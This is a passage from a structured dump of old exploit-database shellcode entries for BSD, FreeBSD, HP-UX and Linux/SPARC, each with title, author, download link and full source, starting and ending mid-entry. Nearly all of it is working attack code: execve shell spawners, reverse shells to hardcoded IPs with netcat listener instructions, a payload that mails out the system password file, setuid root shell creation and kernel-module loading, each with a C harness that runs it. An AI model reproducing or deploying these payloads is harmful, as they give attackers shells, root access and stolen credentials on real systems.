"\t\"\\x50\\xcd\\x80\\xb1\\x03\\xbb\\xff\\xff\\xff\\xff\\x43\\x53\\x52\\xb0\\x5a\"", "\t\"\\x50\\xcd\\x80\\xe0\\xf6\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\"", "\t\"\\x62\\x69\\x6e\\x89\\xe2\\x50\\x54\\x52\\xb0\\x3b\\x50\\xcd\\x80\\xe8\\xa5\"", "\t\"\\xff\\xff\\xff\\x41\";", "int", "main()", "{", "\tint *ret;", "\tret=(int*)&ret+2;", "\t(*ret)=(int)shellcode;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "BSD/x86 - execve(/bin/cat /etc/master.passwd) | mail root@localhost Shellcode (92 bytes)", "Author": "Matias Sedalo", "Published": ": 2004-09-26", "Platform": "BSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-91.php", "View": null, "code": ["/*", "   *BSD version", "   FreeBSD, OpenBSD, NetBSD.", "", "   s0t4ipv6@shellcode.com.ar", "", "   92 bytes.", "", "   _execve(/bin/sh -c \"/bin/cat /etc/master.passwd|mail root@localhost\");", "   pueden reemplzar el comando por lo que se les ocurra.", "*/", "", "char shellcode[]=", "", "    \"\\xeb\\x25\"             /* jmp     <shellcode+39>         */", "    \"\\x59\"                 /* popl    %ecx                   */", "    \"\\x31\\xc0\"             /* xorl    %eax,%eax              */", "    \"\\x50\"                 /* pushl   %eax                   */", "    \"\\x68\\x6e\\x2f\\x73\\x68\" /* push    $0x68732f6e            */", "    \"\\x68\\x2f\\x2f\\x62\\x69\" /* push    $0x69622f2f            */", "    \"\\x89\\xe3\"             /* movl    %esp,%ebx              */", "    \"\\x50\"                 /* pushl   %eax                   */", "    \"\\x66\\x68\\x2d\\x63\"     /* pushw   $0x632d                */", "    \"\\x89\\xe7\"             /* movl    %esp,%edi              */", "    \"\\x50\"                 /* pushl   %eax                   */", "    \"\\x51\"                 /* pushl   %ecx                   */", "    \"\\x57\"                 /* pushl   %edi                   */", "    \"\\x53\"                 /* pushl   %ebx                   */", "    \"\\x89\\xe7\"             /* movl    %esp,%edi              */", "    \"\\x50\"                 /* pushl   %eax                   */", "    \"\\x57\"                 /* pushl   %edi                   */", "    \"\\x53\"                 /* pushl   %ebx                   */", "    \"\\x50\"                 /* pushl   %eax                   */", "    \"\\xb0\\x3b\"             /* movb    $0x0b,%al              */", "    \"\\xcd\\x80\"             /* int     $0x80                  */", "    \"\\xe8\\xd6\\xff\\xff\\xff\" /* call    <shellcode+2>          */", "    \"/bin/cat /etc/master.passwd|mail root@localhost\";", "", "main()", "{", "   int *ret;", "   printf(\"Shellcode lenght=%d\\n\",sizeof(shellcode));", "   ret=(int*)&ret+2;", "   (*ret)=(int)shellcode;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "BSD/x86 - Reverse (192.168.2.33:6969/TCP) Shell Shellcode (129 bytes)", "Author": "Sinan Eren", "Published": ": 2004-09-26", "Platform": "BSD", "Download": "http://shell-storm.org/shellcode/files/shellcode-676.php", "View": null, "code": ["/* reverse-portshell *BSD shellcode by noir       */", "/* local usage: ./reverse-shell 192.168.2.33      */", "/* remote:  nc -n -v -v -l -p 6969                */ ", "/* listen on 6969/tcp\t\t\t\t  */", "/* noir@gsu.linux.org.tr\t\t\t  */", "", "char shellcode[] = ", "{", "  0x31,0xc9,0x51,0x41,   ", "  0x51,0x41,0x51,0x51,", "  0x31,0xc0,0xb0,0x61,", "  0xcd,0x80,0x89,0x07,", "  0x31,0xc9,0x88,0x4f, ", "  0x04,0xc6,0x47,0x05,", "  0x02,0xc7,0x47,0x08,", "  0xc0,0xa8,0x01,0x45, //ipaddr", "  0x66,0xc7,0x47,0x06,   ", "  0x1b,0x39,0x6a,0x10,", "  0x8d,0x47,0x04,0x50,  ", "  0x8b,0x07,0x50,0x50,", "  0x31,0xc0,0xb0,0x62,   ", "  0xcd,0x80,0x31,0xc9,", "  0x51,0x8b,0x07,0x50,   ", "  0x50,0x31,0xc0,0xb0,", "  0x5a,0xcd,0x80,0x41,   ", "  0x83,0xf9,0x03,0x75,", "  0xef,0x31,0xc9,0x51,   ", "  0x51,0x31,0xc0,0xb0,", "  0x17,0xcd,0x80,0xeb,   ", "  0x23,0x5b,0x89,0x1f,", "  0x31,0xc9,0x88,0x4b,   ", "  0x07,0x89,0x4f,0x04,", "  0x51,0x8d,0x07,0x50,   ", "  0x8b,0x07,0x50,0x50,", "  0x31,0xc0,0xb0,0x3b,   ", "  0xcd,0x80,0x31,0xc9,", "  0x51,0x51,0x31,0xc0,   ", "  0xb0,0x01,0xcd,0x80,", "  0xe8,0xd8,0xff,0xff,   ", "  0xff,0x2f,0x62,0x69,", "  0x6e,0x2f,0x73,0x68,   ", "  0x41", "};", "", "int", "main(int argc, char ** argv)", "{", "  void (*f) (void);", "  unsigned int d;", "", "  if(!argv[0])", "    exit(0);", "", "  d = inet_addr(argv[1]);", "  printf(\"IP: %lx shellcode len: %d\\n\", d, strlen(shellcode));", "", "  shellcode[28] = d & 0xff ;", "  shellcode[29] = (d >> 8) & 0xff;", "  shellcode[30] = (d >> 16) & 0xff;", "  shellcode[31] = (d >> 24) & 0xff;", "", "  f =  (void *) shellcode;", "  f();", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "BSDi/x86 - execve(/bin/sh) Shellcode (45 bytes)", "Author": "duke", "Published": ": 2004-09-26", "Platform": "BSDi_x86", "Download": "https://old.exploit-db.com/download/13257.c", "View": "https://old.exploit-db.com/raw/13257/", "code": ["/*", " *  BSDi", " *  execve() of /bin/sh by duke (duke@viper.net.au)", " */", "", "char bsdi_shell[]=", "  \"\\xeb\\x1f\\x5e\\x31\\xc0\\x89\\x46\\xf5\\x88\\x46\\xfa\\x89\\x46\\x0c\\x89\\x76\"", "  \"\\x08\\x50\\x8d\\x5e\\x08\\x53\\x56\\x56\\xb0\\x3b\\x9a\\xff\\xff\\xff\\xff\\x07\"", "  \"\\xff\\xe8\\xdc\\xff\\xff\\xff/bin/sh\\x00\";", "", "# milw0rm.com [2004-09-26]"]},
{"Title": "BSDi/x86 - execve(/bin/sh) + ToUpper Encoded Shellcode (97 bytes)", "Author": "anonymous", "Published": ": 2004-09-26", "Platform": "BSDi_x86", "Download": "https://old.exploit-db.com/download/13260.c", "View": "https://old.exploit-db.com/raw/13260/", "code": ["/*", "\tBSDi shellcode", "", "\tjmp    0x57", "\tpop    %esi", "\txor    %ebx,%ebx", "\tadd    $0x8,%ebx", "\tadd    $0x2,%ebx", "\tmov    %bl,0x26(%esi)", "\txor    %ebx,%ebx", "\tadd    $0x23,%ebx", "\tadd    $0x23,%ebx", "\tmov    %bl,0xffffffa8(%esi)", "\txor    %ebx,%ebx", "\tadd    $0x26,%ebx", "\tadd    $0x30,%ebx", "\tmov    %bl,0xffffffc2(%esi)", "\txor    %eax,%eax", "\tmov    %al,0xb(%esi)", "\tmov    %esi,%ebx", "\tadd    $0x5,%eax", "\txor    %ecx,%ecx", "\tadd    $0x1,%ecx", "\txor    %edx,%edx", "\tint    $0x80", "\tmov    %eax,%ebx", "\txor    %eax,%eax", "\tadd    $0x4,%eax", "\txor    %edx,%edx", "\tmov    %dl,0x27(%esi)", "\tmov    %esi,%ecx", "\tadd    $0xc,%ecx", "\tadd    $0x1b,%edx", "\tint    $0x80", "\txor    %eax,%eax", "\tadd    $0x6,%eax", "\tint    $0x80", "\txor    %eax,%eax", "\tadd    $0x1,%eax", "\tint    $0x80", "\t.string\t\"BIN/SH\"", "*/", "", "char code[] =", "  \"\\xeb\\x57\\x5e\\x31\\xdb\\x83\\xc3\\x08\\x83\\xc3\\x02\\x88\\x5e\"", "  \"\\x26\\x31\\xdb\\x83\\xc3\\x23\\x83\\xc3\\x23\\x88\\x5e\\xa8\\x31\"", "  \"\\xdb\\x83\\xc3\\x26\\x83\\xc3\\x30\\x88\\x5e\\xc2\\x31\\xc0\\x88\"", "  \"\\x46\\x0b\\x89\\xf3\\x83\\xc0\\x05\\x31\\xc9\\x83\\xc1\\x01\\x31\"", "  \"\\xd2\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x83\\xc0\\x04\\x31\\xd2\\x88\"", "  \"\\x56\\x27\\x89\\xf1\\x83\\xc1\\x0c\\x83\\xc2\\x1b\\xcd\\x80\\x31\"", "  \"\\xc0\\x83\\xc0\\x06\\xcd\\x80\\x31\\xc0\\x83\\xc0\\x01\\xcd\\x80\"", "  \"BIN/SH\";", "", "main()", "{", "  int (*f)();", "  f = (int (*)()) code;", "  printf(\"BSDi old shellcode, %d bytes\\n\", strlen(code));", "  (int)(*f)();", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "FreeBSD/x86 - execve(/bin/sh) Shellcode (23 bytes) (2)", "Author": "marcetam", "Published": ": 2004-09-26", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-675.php", "View": null, "code": ["/* FreeBSD 23 byte execve code. Greetz to anathema, the first who published  *", " * this way of writing shellcodes.                                           *", " *  greetz to preedator                              marcetam                *", " *                                                admin@marcetam.net         *", " ****************************************************************************/", "", "char fbsd_execve[]=", "  \"\\x99\"                  /* cdq              */", "  \"\\x52\"                  /* push %edx        */", "  \"\\x68\\x6e\\x2f\\x73\\x68\"  /* push $0x68732f6e */", "  \"\\x68\\x2f\\x2f\\x62\\x69\"  /* push $0x69622f2f */", "  \"\\x89\\xe3\"              /* movl %esp,%ebx   */", "  \"\\x51\"                  /* push %ecx - or %edx :) */", "  \"\\x52\"                  /* push %edx - or %ecx :) */", "  \"\\x53\"                  /* push %ebx        */", "  \"\\x53\"                  /* push %ebx        */", "  \"\\x6a\\x3b\"              /* push $0x3b       */", "  \"\\x58\"                  /* pop %eax         */", "  \"\\xcd\\x80\";             /* int $0x80        */", "", "int main() {", "  void (*run)()=(void *)fbsd_execve;", "  printf(\"%d bytes \\n\",strlen(fbsd_execve));", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "FreeBSD/x86 - execve(/bin/sh) Shellcode (37 bytes)", "Author": "preedator", "Published": ": 2004-09-26", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-171.php", "View": null, "code": ["/* This is FreeBSD execve() code.It is 37 bytes long.I'll try to make it *", " * smaller.Till then use this one.                                       *", " *                                       signed predator                 *", " *                                       preedator(at)sendmail(dot)ru    *", " *************************************************************************/", "", "char FreeBSD_code[]=", "\"\\xeb\\x17\\x5b\\x31\\xc0\\x88\\x43\\x07\\x89\\x5b\\x08\\x89\\x43\\x0c\\x50\\x8d\"", "\"\\x53\\x08\\x52\\x53\\xb0\\x3b\\x50\\xcd\\x80\\xe8\\xe4\\xff\\xff\\xff/bin/sh\";", "", "int main(){", " int *ret=(int *)(&ret+2);", " printf(\"len : %d\\n\",strlen(FreeBSD_code));", " *ret=(int)FreeBSD_code;", "}", "", "/*****************************************", " *int main(){                            *", " *   __asm__(\"jmp  callme         \\n\"    *", " *           \"jmpme:              \\n\"    *", " *           \"pop %ebx            \\n\"    *", " *           \"xorl %eax,%eax      \\n\"    *", " *           \"movb %al,0x7(%ebx)  \\n\"    *", " *           \"movl %ebx,0x8(%ebx) \\n\"    *", " *\t     \"movl %eax,0xc(%ebx) \\n\"    *", " *           \"push %eax           \\n\"    *", " *\t     \"leal 0x8(%ebx),%edx \\n\"    *", " *\t     \"push %edx           \\n\"    *", " *\t     \"push %ebx           \\n\"    *", " *\t     \"movb $0x3b,%al      \\n\"    *", " *           \"push %eax\t          \\n\"    *", " *           \"int $0x80           \\n\"    *", " *           \"callme:\t          \\n\"    *", " *           \"call jmpme          \\n\"    *", " *           \".string \\\"/bin/sh\\\" \\n\");  *", " *}                                      *", " *****************************************/", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "FreeBSD/x86 - Load Kernel Module (/sbin/kldload /tmp/o.o) Shellcode (74 bytes)", "Author": "dev0id", "Published": ": 2004-09-26", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-172.php", "View": null, "code": ["/* The kldload shellcode", "   setuid(0)", "   loads /tmp/o.o kernel module", "", "   Size\t74 bytes", "   OS   FreeBSD", "\t\t/rootteam/dev0id \t(www.sysworld.net)", "\t\t\tdev0id@uncompiled.com", "", "BITS\t32", "jmp\tshort\tcallme", "main:", "\tpop\tesi", "\txor\teax,eax", "\tmov\tal,0x17", "\tpush\teax", "\tint\t0x80", "\txor\teax,eax", "\tpush\teax", "\tpush long\t0x68732f6e", "\tpush long\t0x69622f2f", "\tmov\tebx,esp", "\tpush\teax", "\tpush word\t0x632d", "\tmov\tedi,esp", "\tpush\teax", "\tpush\tesi", "\tpush\tedi", "\tpush\tebx", "\tmov\tedi,esp", "\tpush\teax", "\tpush\tedi", "\tpush\tebx", "\tpush\teax", "\tmov\tal,0x3b", "\tint\t0x80", "callme:", "\tcall\tmain", "\tdb\t'/sbin/kldload /tmp/o.o'", "*/", "", "char shellcode[] =", "\t\"\\xeb\\x2c\\x5e\\x31\\xc0\\xb0\\x17\\x50\\xcd\\x80\\x31\\xc0\\x50\\x68\\x6e\"", "\t\"\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x66\\x68\\x2d\\x63\"", "\t\"\\x89\\xe7\\x50\\x56\\x57\\x53\\x89\\xe7\\x50\\x57\\x53\\x50\\xb0\\x3b\\xcd\"", "\t\"\\x80\\xe8\\xcf\\xff\\xff\\xff\\x2f\\x73\\x62\\x69\\x6e\\x2f\\x6b\\x6c\\x64\"", "\t\"\\x6c\\x6f\\x61\\x64\\x20\\x2f\\x74\\x6d\\x70\\x2f\\x6f\\x2e\\x6f\";", "", "int", "main(void)", "{", "\tint *ret;", "\tret = (int*)&ret+2;", "\t(*ret) = shellcode;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "FreeBSD/x86 - chown 0:0 + chmod 6755 + execve(/tmp/sh) Shellcode (44 bytes)", "Author": "Claes M. Nyberg", "Published": ": 2004-09-26", "Platform": "FreeBSD_x86", "Download": "https://old.exploit-db.com/download/13276.c", "View": "https://old.exploit-db.com/raw/13276/", "code": ["/*", " * FreeBSD shellcode", " * chown(\"/tmp/sh\", 0, 0); chmod(\"/tmp/sh\", 06755);", " * 44 bytes", " * ", " * Claes M. Nyberg 20020209", " *", " * <cmn@darklab.org>, <md0claes@mdstud.chalmers.se>", " */", "", "/*************************************************************", "void", "main(void)", "{", "__asm__(\"", "          xor      %eax, %eax      # eax = 0 ", "          pushl    %eax            # string ends with NULL ", "          pushl    $0x68732f2f     # push 'hs//' (//sh) ", "          pushl    $0x706d742f     # push 'pmt/' (/tmp) ", "          movl     %esp, %ebx      # ebx = &string[0]  ", "          push     %eax            # 0 ", "          push     %eax            # 0 ", "          push     %ebx            # /tmp/sh ", "          push     %eax            # Dummy ", "          mov      $0x10, %al      # eax = 16 = chown ", "          int      $0x80           # chown(/tmp/sh, 0, 0); ", "          xor      %eax, %eax      # eax = 0", "          or       $0xded, %ax     # eax = 06755", "          pushl    %eax            # 06755 ", "          push     %ebx            # /tmp/sh ", "          pushl    %eax            # dummy ", "          xor      %eax, %eax      # eax = 0", "          mov      $0xf, %al       # eax = 15 = chmod ", "          int      $0x80           # chmod(/tmp/sh, 06755); ", "          mov      $0x1, %al       # eax = 1 = exit", "\t\t  push     %eax            # exit value = 1", "          push     %eax            # Dummy", "          int      $0x80           # exit(1);", "    \");", "}", "", "*************************************************************/", "", "#include <stdio.h>", "#include <string.h>", "", "static char freebsd_code[] =", "\t\t\"\\x31\\xc0\"              /* xor      %eax, %eax  */", "\t\t\"\\x50\"                  /* pushl    %eax        */", "\t\t\"\\x68\\x2f\\x2f\\x73\\x68\"  /* pushl    $0x68732f2f */", "\t\t\"\\x68\\x2f\\x74\\x6d\\x70\"  /* pushl    $0x706d742f */", "\t\t\"\\x89\\xe3\"              /* movl     %esp, %ebx  */", "\t\t\"\\x50\"                  /* pushl    %eax        */", "\t\t\"\\x50\"                  /* pushl    %eax        */", "\t\t\"\\x53\"                  /* pushl    %ebx        */", "\t\t\"\\x50\"                  /* pushl    %eax        */", "\t\t\"\\xb0\\x10\"              /* mov      $0x10, %al  */", "\t\t\"\\xcd\\x80\"              /* int      $0x80       */", "\t\t\"\\x31\\xc0\"              /* xor      %eax, %eax  */", "\t\t\"\\x66\\x0d\\xed\\x0d\"      /* or       $0xded, %ax */", "\t\t\"\\x50\"                  /* pushl    %eax        */", "\t\t\"\\x53\"                  /* push     %ebx        */", "\t\t\"\\x50\"                  /* pushl    %eax        */", "\t\t\"\\x31\\xc0\"              /* xor      %eax, %eax  */", "\t\t\"\\xb0\\x0f\"              /* mov      $0xf, %al   */", "\t\t\"\\xcd\\x80\"              /* int      $0x80       */", "        \"\\xb0\\x01\"              /* mov      $0x1, %al   */", "        \"\\x50\"                  /* push     %eax        */", "        \"\\x50\"                  /* push     %eax        */", "        \"\\xcd\\x80\";             /* int      $0x80       */", "", "static char _freebsd_code[] =", "        \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\"", "        \"\\x68\\x2f\\x74\\x6d\\x70\\x89\\xe3\\x50\"", "        \"\\x50\\x53\\x50\\xb0\\x10\\xcd\\x80\\x31\"", "        \"\\xc0\\x66\\x0d\\xed\\x0d\\x50\\x53\\x50\"", "        \"\\x31\\xc0\\xb0\\x0f\\xcd\\x80\\xb0\\x01\"", "        \"\\x50\\x50\\xcd\\x80\";", "", "void", "main(void)", "{", "    void (*code)() = (void *)_freebsd_code;", "    printf(\"strlen code: %d\\n\", strlen(freebsd_code));", "    code();", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "FreeBSD/x86 - execve(/tmp/sh) Shellcode (34 bytes)", "Author": "Claes M. Nyberg", "Published": ": 2004-09-26", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-100.php", "View": null, "code": ["/*", " * FreeBSD shellcode - execve /tmp/sh", " * ", " * Claes M. Nyberg 20020120", " *", " * <cmn@darklab.org>, <md0claes@mdstud.chalmers.se>", " */", "", "/**********************************************************", "void", "main()", "{", "__asm__(\"", "        xorl    %eax, %eax   # eax = 0", "        pushl   %eax         # string ends with NULL", "        pushl   $0x68732f2f  # push 'hs//' (//sh)", "        pushl   $0x706d742f  # push 'pmt/' (/tmp)", "        movl    %esp, %ebx   # ebx = argv[0] = string addr", "        pushl   %eax         # argv[1] = NULL", "        pushl   %ebx         # argv[0] = /bin//sh", "        movl    %esp, %edx   # edx = &argv[0]", "        ", "        pushl   %eax         # envp = NULL", "        pushl   %edx         # &argv[0]", "        pushl   %ebx         # *path = argv[0]", "        pushl   %eax         # Dummy", "        movb    $0x3b, %al   # al = 59 = execve", "        int     $0x80        # execve(argv[0], argv, NULL)", "", "        xorl    %eax, %eax   # eax = 0", "        inc     %eax         # eax++", "        pushl   %eax         # Exit value = 1", "        pushl   %eax         # Dummy", "        int     $0x80        # exit(1); (eax is 1 = execve)", "    \");", "}", "************************************************************/", "", "#include <stdio.h>", "#include <string.h>", "", "static char freebsd_code[] =", "    \"\\x31\\xc0\"               /* xorl    %eax, %eax  */", "    \"\\x50\"                   /* pushl   %eax        */", "    \"\\x68\\x2f\\x2f\\x73\\x68\"   /* pushl   $0x68732f2f */", "    \"\\x68\\x2f\\x74\\x6d\\x70\"   /* pushl   $0x706d742f */", "    \"\\x89\\xe3\"               /* movl    %esp, %ebx  */", "    \"\\x50\"                   /* pushl   %eax        */", "    \"\\x53\"                   /* pushl   %ebx        */", "    \"\\x89\\xe2\"               /* movl    %esp, %edx  */", "    \"\\x50\"                   /* pushl   %eax        */     ", "    \"\\x52\"                   /* pushl   %edx        */    ", "    \"\\x53\"                   /* pushl   %ebx        */", "    \"\\x50\"                   /* pushl   %eax        */", "    \"\\xb0\\x3b\"               /* movb    $0x3b, %al  */", "    \"\\xcd\\x80\"               /* int     $0x80       */", "    \"\\x31\\xc0\"               /* xorl    %eax, %eax  */", "    \"\\x40\"                   /* inc     %eax        */ ", "    \"\\x50\"                   /* pushl   %eax        */", "    \"\\x50\"                   /* pushl   %eax        */", "    \"\\xcd\\x80\";              /* int     $0x80       */", "", "", "static char _freebsd_code[] =", "    \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\"", "    \"\\x68\\x2f\\x74\\x6d\\x70\\x89\\xe3\\x50\"", "    \"\\x53\\x89\\xe2\\x50\\x52\\x53\\x50\\xb0\"", "    \"\\x3b\\xcd\\x80\\x31\\xc0\\x40\\x50\\x50\"", "    \"\\xcd\\x80\";", "", "void", "main(void)", "{", "\tvoid (*code)() = (void *)freebsd_code;", "\tprintf(\"strlen code: %d\\n\", strlen(freebsd_code));", "\tcode();", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "FreeBSD/x86 - Reverse (127.0.0.1:31337/TCP) Shell (/bin/sh) Shellcode (102 bytes)", "Author": "Scrippie", "Published": ": 2004-09-26", "Platform": "FreeBSD_x86", "Download": "https://old.exploit-db.com/download/13278.asm", "View": "https://old.exploit-db.com/raw/13278/", "code": ["; Passive Connection Shellcode", ";", "; Coded by Scrippie - ronald@grafix.nl - http://b0f.freebsd.lublin.pl", "; Buffer0verfl0w Security", "; Why? This evades firewalls...", ";", "; YES, this is for NASM, I detest AT&T syntaxis - it's gross and unreadable", ";", "; This is the FreeBSD variant I whipped up", ";", "; Tnx to dvorak for pointing out that BSD's int 80h assumes a stored EIP", "; on the stack before making it and that BSD has a somwhat different", "; sockaddr_in structure (containing sin_len)", "", "        BITS 32", "", "; Equates - keeps this stuff a lot more clear", "", "PORT            equ 31337       ; What an eleet port!", "", "_exit           equ 1           ; See /usr/src/sys/kern/syscalls.c", "execve          equ 59          ; See /usr/src/sys/kern/syscalls.c", "dup2            equ 90          ; See /usr/src/sys/kern/syscalls.c", "socket          equ 97          ; See /usr/src/sys/kern/syscalls.c", "connect         equ 98          ; See /usr/src/sys/kern/syscalls.c", "", "IPPROTO_TCP     equ 6           ; See netinet/in.h", "PF_INET         equ 2           ; See sys/socket.h", "SOCK_STREAM     equ 1           ; See sys/socket.h", "", "sockaddr_in_off equ 0", "shell_off       equ 8", "shell_ptr_off   equ 16", "", "        jmp short EndCode", "", "Start:", "        pop esi                 ; Get offset data in esi", "", "        xor eax, eax", "        xor ebx, ebx", "", "        mov bl, IPPROTO_TCP     ; Push IPPROTO_TCP", "        push ebx", "        mov bl, SOCK_STREAM     ; Push SOCK_STREAM", "        push ebx", "        mov bl, PF_INET         ; Push PF_INET", "        push ebx", "        push ebx                ; Skipped by int 80h", "        mov al, socket          ; Select socket() syscall", "", "        int 80h                 ; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)", "        mov edx, eax            ; Save the resulting socket descriptor", "", "        mov byte [esi+sockaddr_in_off+1], PF_INET ; sin_family -> PF_INET", "        mov word [esi+sockaddr_in_off+2], PORT  ; Set the port number", "", "        mov bl, 16                      ; sizeof(sockaddr_in)", "        push ebx", "", "        lea ebx, [esi+sockaddr_in_off]  ; Get offset sockaddr_in into ebx", "        push ebx                        ; Push it", "        push eax                        ; Still holds sockfd", "        push eax                        ; Canary value", "", "        mov al, connect                 ; Select connect() syscall", "        int 80h                         ; connect(sockfd, sockaddr_in, 10)", "", "        xor ebx, ebx", "        push ebx", "        push edx", "        mov al, dup2                    ; Select dup2 syscall", "", "        push eax                        ; Ruined", "        int 80h", "", "        inc bl", "        push ebx", "        push edx", "        mov al, dup2                    ; Do the same for stdout", "        ", "        push eax", "        int 80h", "", "        inc bl", "        push ebx", "        push edx", "        mov al, dup2                    ; And finally for stderr", "", "        push eax", "        int 80h", "", "        xor ebx, ebx", "        push ebx                ; *envp == NULL", "", "        lea edi, [esi+shell_off+7]", "        xor eax, eax", "        xor ecx, ecx", "        mov cl, 9", "        repe stosb", "", "        lea ebx, [esi+shell_off]        ; Get offset shell into ebx", "        mov [esi+shell_ptr_off], ebx    ; Store it at shell_off", "        lea ecx, [esi+shell_ptr_off]    ; Get offset shell_off into ecx", "        push ecx                        ; argp", "        push ebx                        ; command", "", "        push eax                ; canary", "        mov al, execve", "        int 80h                 ; Spawn the frikkin' shell", "", "        mov al, _exit           ; _exit() system call", "        int 80h                 ; Do it", "", "EndCode:", "        call Start", "", "sockaddr_in     db 'ABCC'               ; A=sin_len - B=sin_family - C=port", "                dd 0x100007f            ; IP addr (s_addr) in htonl() form", "; 8 bytes not needed ;)", "", "shell           db '/bin/sh' ;,0", ";shell_ptr      db 1,2,3,4", "", "------------------------------------------------------------------------------", "", "And here's the shellcode equivalent", "", "", "char shellcode[]=", "\"\\xeb\\x68\\x5e\\x31\\xc0\\x31\\xdb\\xb3\\x06\\x53\\xb3\\x01\\x53\\xb3\\x02\\x53\\x53\\xb0\\x61\\x", "cd\\x80\\x89\\xc2\\xc6\\x46\\x01\\x02\\x66\\xc7\\x46\\x02\\x69\\x7a\\xb3\\x10\\x53\\x8d\\x1e\\x53\\", "x50\\x50\\xb0\\x62\\xcd\\x80\\x31\\xdb\\x53\\x52\\xb0\\x5a\\x50\\xcd\\x80\\xfe\\xc3\\x53\\x52\\xb0", "\\x5a\\x50\\xcd\\x80\\xfe\\xc3\\x53\\x52\\xb0\\x5a\\x50\\xcd\\x80\\x31\\xdb\\x53\\x8d\\x7e\\x0f\\x3", "1\\xc0\\x31\\xc9\\xb1\\x09\\xf3\\xaa\\x8d\\x5e\\x08\\x89\\x5e\\x10\\x8d\\x4e\\x10\\x51\\x53\\x50\\x", "b0\\x3b\\xcd\\x80\\xb0\\x01\\xcd\\x80\\xe8\\x93\\xff\\xff\\xff\\x41\\x42\\x43\\x43\\x7f\\x00\\x00\\", "x01\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\";\t\t\t\t    ^", "", "\t\t\t\t\t\t             Start of IP addr", "", "void main() {", "        int *ret;", "", "        ret = (int *)&ret + 2;", "        (*ret) = (int)shellcode;", "", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "HP-UX - execve(/bin/sh) Shellcode (58 bytes)", "Author": "K2", "Published": ": 2004-09-26", "Platform": "HP-UX", "Download": "http://shell-storm.org/shellcode/files/shellcode-133.php", "View": null, "code": ["/*", " *  Hp-Ux", " *  ", " *  execve() of /bin/sh by K2", " */", "", "u_char shellcode[] =", "  \"\\xe8\\x3f\\x1f\\xfd\\x08\\x21\\x02\\x80\\x34\\x02\\x01\\x02\\x08\\x41\\x04\\x02\\x60\\x40\"", "  \"\\x01\\x62\\xb4\\x5a\\x01\\x54\\x0b\\x39\\x02\\x99\\x0b\\x18\\x02\\x98\\x34\\x16\\x04\\xbe\"", "  \"\\x20\\x20\\x08\\x01\\xe4\\x20\\xe0\\x08\\x96\\xd6\\x05\\x34\\xde\\xad\\xca\\xfe/bin/sh\\xff\";", "", "# milw0rm.com [2004-09-26]"]},
{"Title": "Linux/SPARC - Reverse (192.168.100.1:2313/TCP) Shell Shellcode (216 bytes)", "Author": "killah", "Published": ": 2004-09-26", "Platform": "Linux_SPARC", "Download": "http://shell-storm.org/shellcode/files/shellcode-85.php", "View": null, "code": ["/* linux (sparc) connect back shellcode, because someone had to evade those firewalls. *sigh* */", "", "/*", " * OS           : Linux", " * Architecture : Sparc", " * Type         : Connect Back", " * Lenght       : 216 Bytes", " * Listen-Port  : 2313/TCP", " * Default IP   : 192.168.100.1 ( see how you'll change it at the end. )", " *", " * null bytes (0x00), breaks (0x0a), nops, fork(), ... avoided.", " * was tested accordingly, couldn't optimized more.", " * plug it in your code, launch nc -l -vvv -p 2313 and wait for it.", " *", " * (c) 2002 killah @ hack . gr", " * All rights reserved.", " *", " */", "", "#define NAME \"Linux Sparc Connect-Back\"", "", "char cb_linux_sparc[]=", "  \"\\x9d\\xe3\\xbf\\x80\"    // save  %sp, -128, %sp", "  \"\\x90\\x10\\x20\\x02\"    // mov  2, %o0", "  \"\\xd0\\x37\\xbf\\xe0\"    // sth  %o0, [ %fp + -32 ]", "  \"\\x90\\x10\\x29\\x09\"    // mov  0x909, %o0", "  \"\\xd0\\x37\\xbf\\xe2\"    // sth  %o0, [ %fp + -30 ]", "  \"\\x13\\x30\\x2a\\x19\"    // sethi  %hi(0xc0a86400), %o1 <- IPv4 ADDRESS MODIFY THIS.", "  \"\\x90\\x12\\x60\\x01\"    // or  %o1, 1, %o0             <- ALSO THIS.", "  \"\\xd0\\x27\\xbf\\xe4\"    // st  %o0, [ %fp + -28 ]", "  \"\\x90\\x10\\x20\\x02\"    // mov  2, %o0", "  \"\\x92\\x10\\x20\\x01\"    // mov  1, %o1", "  \"\\x94\\x22\\x60\\x01\"    // sub  %o1, 1, %o2", "  \"\\xd0\\x23\\xa0\\x44\"    // st  %o0, [ %sp + 0x44 ]", "  \"\\xd2\\x23\\xa0\\x48\"    // st  %o1, [ %sp + 0x48 ]", "  \"\\xd4\\x23\\xa0\\x4c\"    // st  %o2, [ %sp + 0x4c ]", "  \"\\x90\\x10\\x20\\x01\"    // mov  1, %o0", "  \"\\x92\\x03\\xa0\\x44\"    // add  %sp, 0x44, %o1", "  \"\\x82\\x10\\x20\\xce\"    // mov  0xce, %g1", "  \"\\x91\\xd0\\x20\\x10\"    // ta  0x10", "  \"\\xd0\\x27\\xbf\\xf4\"    // st  %o0, [ %fp + -12 ]", "  \"\\x92\\x07\\xbf\\xe0\"    // add  %fp, -32, %o1", "  \"\\xd0\\x07\\xbf\\xf4\"    // ld  [ %fp + -12 ], %o0", "  \"\\x94\\x10\\x20\\x10\"    // mov  0x10, %o2", "  \"\\xd0\\x23\\xa0\\x44\"    // st  %o0, [ %sp + 0x44 ]", "  \"\\xd2\\x23\\xa0\\x48\"    // st  %o1, [ %sp + 0x48 